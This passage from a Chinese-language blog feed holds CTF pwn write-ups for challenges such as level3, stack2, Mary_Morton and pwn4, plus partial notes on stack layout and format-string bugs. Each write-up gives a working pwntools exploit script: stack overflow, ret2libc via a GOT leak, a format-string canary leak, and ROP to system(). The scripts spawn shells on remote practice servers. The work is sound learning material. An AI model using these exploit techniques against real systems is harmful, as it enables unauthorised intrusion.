title="level3"></a>level3</h2><blockquote><p>开始查保护后没注意到NX，在栈上几次没执行成功才回去看到。这个题实际还是栈溢出，但多考了很多知识点，对刚接触pwn收获还是很大。</p></blockquote><ul><li><p>首先查保护，只开了NX，没有canary，那就可以往靠溢出控制程序走向了的方向看题。</p></li><li><p>载入ida后，栈溢出很明显。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606153058583.png" alt="image-20200606153058583"></p></li><li><p>但利用起来，既没有有system函数，也没有’/bin/sh’。这对于刚接触pwn还是比较困难的，但本来就学习的过程，看了writeup又去学了下.plt与.got再来做的题。</p></li><li><p>其实程序带了一个运行库的，里面有动态链接库的函数及一些其他信息。既然程序里没有自然就利用这个运行库了，根据elf文件与pe文件类似，各个函数与数据的相对地址是不变的。利用这一点与我们在程序中是调用了write与read动态库函数的，随便选择一个得到他们的地址，再根据相对地址相加减就得到我们要的函数与数据（system()与‘/bin/sh’）的地址了。</p></li><li><p>首先计算在运行库里的的read函数与system函数的相对地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sys_cha = hex(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure></li><li><p>计算运行库中read函数与 ‘/bin/sh’的相对地址。先找到 ’/bin/sh’的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so<span class="number">.6</span> --string <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606155906601.png" alt="image-20200606155906601"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">bin_cha = hex(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure></li><li><p>有 a-b=c，现在我们有了c，只需通过程序溢出就可以找到b, 最后通 a = b+c得到我们要的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></li><li><p>将各部分结合起来，脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">bin_cha = int(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = int(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200606172047471.png" alt="image-20200606172047471"></p></li><li><p><strong>总结：1.u32()相当于p32()的逆运算。2.ELF的各种使用。3.对.plt与.got的学习。4. 从运行库寻找所要函数与数据。5.这道题对于刚接触pwn的来做，可做性很高。</strong></p></li></ul><hr><h2 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h2><blockquote><p>上之前做的 guess_game 一个道理。通过栈溢出，改变程序特定的值。</p></blockquote><ul><li><p>查保护没有 canary，这也算是引导了，因为是做题。</p></li><li><p>ida中看一下。就是随机数种子精确到了秒，所以直接通过栈溢出改变种子的值。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200607160312039.png" alt="image-20200607160312039"></p></li><li><p>写脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">43642</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span><span class="number">-0x10</span>)*<span class="string">'a'</span> + p64(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">    p.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200607160518598.png" alt="image-20200607160518598"></p></li><li><p><strong>总结：1.虽然没有接触新知识，但是学了加载libc.so.6库使用其的函数。</strong></p></li></ul><hr><h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><blockquote><p>由于数组没有控制界限，还是栈溢出。这个题由于出题人在题中直接给出了bin/bash，而环境中只有sh，但只要ROP一下，自己通过bin/bash构造sh给system做参数即可。</p></blockquote><ul><li><p>查保护，除了基地址随机化其他全开。感觉会有点麻烦，难度要绕过canary？ida中看一下。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609105006912.png" alt="image-20200609105006912"></p></li><li><p>正好看到字符串中有现成的system函数及shell，所以通过上面的数组溢出将函数的返回地址改为system处的地址就得到shell了。</p></li><li><p>开始计算数组的地址到函数返回地址处在栈中的偏移，由于ida中静态看到的栈分布可能不准，通过gdb动调看一下。找到第一次给数组赋值的地址及最后ret指令地址下断。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609105624424.png" alt="image-20200609105624424"></p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609105703718.png" alt="image-20200609105703718"></p></li><li><p>可以看到上面2次的地址分别为<strong>0xffffd01c</strong> <strong>0xffffcf98</strong> 2者之差为<strong>0x84</strong>，即我们要的偏移。</p></li><li><p>开始写脚本攻击，但是并没有得到shell。。。找了一会儿错误，没发现。看了其他人的writeup说由于出题人原因，环境中并没有bash，可以通过已有的 /bin/bash得到sh字符串，作为system()参数才行。</p></li><li><p>也很容易，直接找到字符串地址，利用数组越界多改变栈中的一个数据为<strong>sh</strong>作为system()的参数即可。exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">58409</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line">system_addr = [<span class="number">0xb4</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+i, system_addr[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+<span class="number">4</span>+i, sh_addr[i])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200609110724445.png" alt="image-20200609110724445"></p></li><li><p>最后关于这个题的栈从ida中静态看到栈与实际动调不同的原因，看开头与结尾的汇编代码可以知道答案。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610140544469.png" alt="image-20200610140544469"></p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610140847175.png" alt="image-20200610140847175"></p></li><li><p><strong>总结：1.从这个题发现数组越界就可以绕过canary，但也是题故意设计的而已。2.静态看到的栈分布于实际运行的可能会不同，这道题就是。</strong></p></li></ul><hr><h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><blockquote><p>栈溢出，多了会对输入字符进行判断多构造下。但是当对整个main函数运行完后在ret处控制其走向始终不成功。。。gdb调试栈的偏移反复确定了的，比在ida中静态看到的大4，但这多出来的4就很迷。。。最后觉得是程序在出栈时有一个值还原，有点canary的意思，但是程序没有开canary保护啊。搞了很久还是没弄清原因，后面知识积累多了再来看看怎么回事。。。</p></blockquote><ul><li><p>只开了NX保护，ida中看下。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610171656557.png" alt="image-20200610171656557"></p></li><li><p>再看看栈的情况。找到v3与v2数组的地址。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610171941539.png" alt="image-20200610171941539"></p></li><li><p>再看到程序中直接有system函数及字符串。</p></li><li><p>所以接下来要做的就是改变函数指针并控制v14的值，构造其执行我们的system（）函数。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610172311560.png" alt="image-20200610172311560"></p></li><li><p>写脚本攻击。这里方法也很多吧，只要构造配合好就可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">39422</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486D2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'Bxnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610172459341.png" alt="image-20200610172459341"></p></li><li><p><strong>总结：1.还是栈溢出，但不是通过改变函数的返回地址，见识更多了吧。2.\x09与\xa是坏字符，当读到这2个字符的时候会截断。</strong></p></li></ul><hr><h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h2><blockquote><p>通过格式化字符串漏洞找到canary后栈溢出控制程序走向。但是。。。。。。。因为开始使用的recvuntil(‘’)没有注意<strong>‘\n’</strong>导致后面直接使用recv()开始只能接收到<strong>’\n’</strong>，花了好多时间卡在这里。。。。。。。。。。算教训了。</p></blockquote><ul><li><p>除了PIE其他保护全开。运行看一下，让选择是栈溢出还是格式化字符串漏洞。 ida中看看。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200611162320998.png" alt="image-20200611162320998"></p></li><li><p>虽然是第一次遇到，但也是很容易想到，格式化字符串漏洞是让我们泄露canary用的，知道的canary就可以快乐的栈溢出了。</p></li><li><p>那剩下的就都是常规操作了，脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53667</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">canary = int(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(canary) + <span class="number">8</span>*<span class="string">'a'</span> + p64(<span class="number">0x00000000004008DA</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>问题来了。。。无论怎么改<strong>canary = int(p.recv(), 16)</strong>接受屏幕打印出的字符这句话都报错。。。2个多小时耗在这里。。。后面就试了试先<strong>p.recvuntil(‘0x’)</strong>，成功了。。。但自己还是很郁闷。。。又继续找原因，最后才发现<strong>p.recvuntil(‘3. Exit the battle ‘)</strong>中少了 <strong>\n</strong>，导致后面直接recv()接受到的都是回车，还是recvuntil()保障。。。</p></li><li><p>加上后再攻击，成功。。。</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200611163417332.png" alt="image-20200611163417332"></p></li><li><p>总结：1.还是多用recvuntil吧，保障些。2.注意使用recvuntil时中的字符串是否包含到最后。3.RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p></li></ul><hr><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><blockquote><p>ADworld没有给题目附件，最后看了看别人发的ida伪代码，就只是简单的栈溢出控制程序走向。</p></blockquote><ul><li><p>题目开头就给了一个地址，后面又是明显的栈溢出，猜也可猜到是将函数返回地址覆盖为给出的地址。</p></li><li><p>脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">37196</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200612101533939.png" alt="image-20200612101533939"></p></li><li><p>总结：无。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;guess-num&quot;&gt;&lt;a href=&quot;#guess-num&quot; class=&quot;headerlink&quot; title=&quot;guess_num&quot;&gt;&lt;/a&gt;guess_num&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;栈溢出&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ida打开看一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200604180206603.png&quot; alt=&quot;image-20200604180206603&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn 论剑场</title>
    <link href="https://www.bxnop.cn/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/"/>
    <id>https://www.bxnop.cn/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/</id>
    <published>2020-06-03T11:59:11.000Z</published>
    <updated>2020-06-12T08:45:46.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><blockquote><p>利用栈溢出控制程序的走向</p></blockquote><ul><li><p>首先使用file与checksec查看一下，64为elf文件，且没有开任何保护，那没有canary，就可以利用栈溢出控制程序走向了。</p></li><li><p>ida中看一下，明显存在溢出。</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605092808030-1591322466624.png" alt="image-20200605092808030"></p></li></ul>  <a id="more"></a><ul><li><p>继续看一下字符串，找到引用的地方发现了system命令，但不是打开shell之类的字符串。</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605093020161.png" alt="image-20200605093020161"></p></li><li><p>由于刚接触，很多东西都不知道，看了writeup，长知识了。由于题中有 $0 字符，而这就是 shell本身的名称，可以用它当作传入的system（）函数的参数使用。</p></li></ul><blockquote><p>一个知识点：<code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/bash -c string</code>来执行参数<code>string</code>字符串所代表的命令，此命令执行完后随即返回原调用的进程。</p></blockquote><blockquote><p>64位程序传参的特点：<strong>使用寄存器传参</strong>，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p></blockquote><ul><li><p>所以这里要先让程序的走向到 <code>pop edi;ret</code>, 让第一个传参寄存器得到 $0的地址，那后面再通过ret 使system（）的地址弹出给 eip，得到shell。</p></li><li><p>开始工作。</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095114997.png" alt="image-20200605095114997"></p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095231700.png" alt="image-20200605095231700"></p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095322038.png" alt="image-20200605095322038"></p></li><li><p>写py脚本攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">edi = <span class="number">0x00000000004007d3</span></span><br><span class="line">bash = <span class="number">0x000000000060111f</span></span><br><span class="line">sys = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(edi) + p64(bash) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>得到shell。</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095503617.png" alt="image-20200605095503617"></p></li><li><p><strong>总结：1.在没有‘bin\bash’字符串时看看’$0‘。2.64位程序的传参方式，寄存器顺序。3.ROPgadget工具的使用。</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;pwn4&quot;&gt;&lt;a href=&quot;#pwn4&quot; class=&quot;headerlink&quot; title=&quot;pwn4&quot;&gt;&lt;/a&gt;pwn4&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;利用栈溢出控制程序的走向&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先使用file与checksec查看一下，64为elf文件，且没有开任何保护，那没有canary，就可以利用栈溢出控制程序走向了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ida中看一下，明显存在溢出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605092808030-1591322466624.png&quot; alt=&quot;image-20200605092808030&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn笔记</title>
    <link href="https://www.bxnop.cn/2020/06/03/pwn%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.bxnop.cn/2020/06/03/pwn%E7%AC%94%E8%AE%B0/</id>
    <published>2020-06-03T05:10:04.000Z</published>
    <updated>2020-06-09T03:42:50.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈的学习理解"><a href="#栈的学习理解" class="headerlink" title="栈的学习理解"></a>栈的学习理解</h2><p>1.对于栈，主要是程序运行中保存函数的运行状态信息，参数及局部变量。发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；函数调用结束后通过一些列指令还原调用函数的状态信息，并执行调用函数下一条指令。</p><blockquote><p>入栈顺序：1.参数 2.调用函数的下一条指令地址（通过 call）3.调用函数栈的基地址（ebp）4.被调用函数需要使用的局部变量。<a id="more"></a></p></blockquote><p>2.一张图可以很清楚的表示出来。</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200609114209670.png" alt="image-20200609114209670"></p><p>3.在ida中看这个也很是方便。</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200603141926461.png" alt="image-20200603141926461"></p><blockquote><p>函数调用结束后：1.先弹出局部变量（mov esp, ebp）2.接着返回调用函数的基地址（pop ebp）3.最后弹出被调用函数的返回地址（pop eip）。此时函数就接着执行被调用函数后面一条指令，再遇到函数调用也是同样的栈操作。</p><p>在看汇编中可以发现，程序在每次弹出局部变量与ebp都是使用一条指令leave，也就是 mov esp, ebp; pop ebp 的功能。</p></blockquote><h2 id="函数传参从左到右"><a href="#函数传参从左到右" class="headerlink" title="函数传参从左到右"></a>函数传参从左到右</h2><p>1.函数传参都是从右向左的。如果是从左向右会怎么样呢？</p><p>2.拿经典的printf(const char *format, argv..)来假设。format最先进栈，之后是各个参数进栈，然后是被调函数的返回地址，调用函数基地址。这个时候被调函数首先肯定是要找到format，但是在它上面还有未知个数的参数，想要知道参数个数又必须找到format，要找到format又必须知道参数个数。这样以来就陷入这样的死循环。</p><p>3.当然从右往左传参就不一样了，直接加固定的esp就可以先找到format，再依次检索参数即可。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>1.触发格式化字符漏洞的主要函数有：printf，sprintf，fprintf。</p><p>2.printf（）函数在执行时并不知道参数个数，它内部有一一个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以没有参数，代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><p>3.当然，规范的使用printf()等函数，还是不会问题。主要就是像<code>gets(s);printf(s)</code>这样的用法，使这个格式化字符串的输入权交给了我们。</p><p>4.其中一个重要的格式化说明符，也是这个漏洞利用的关键。<strong>%xn</strong>，将我们前面已经输入的字符个数值写入后面的第x个参数的地址内。</p><p>5.一个例子可以很好的说明。</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200605190434500.png" alt="image-20200605190434500"></p><h2 id="plt与got"><a href="#plt与got" class="headerlink" 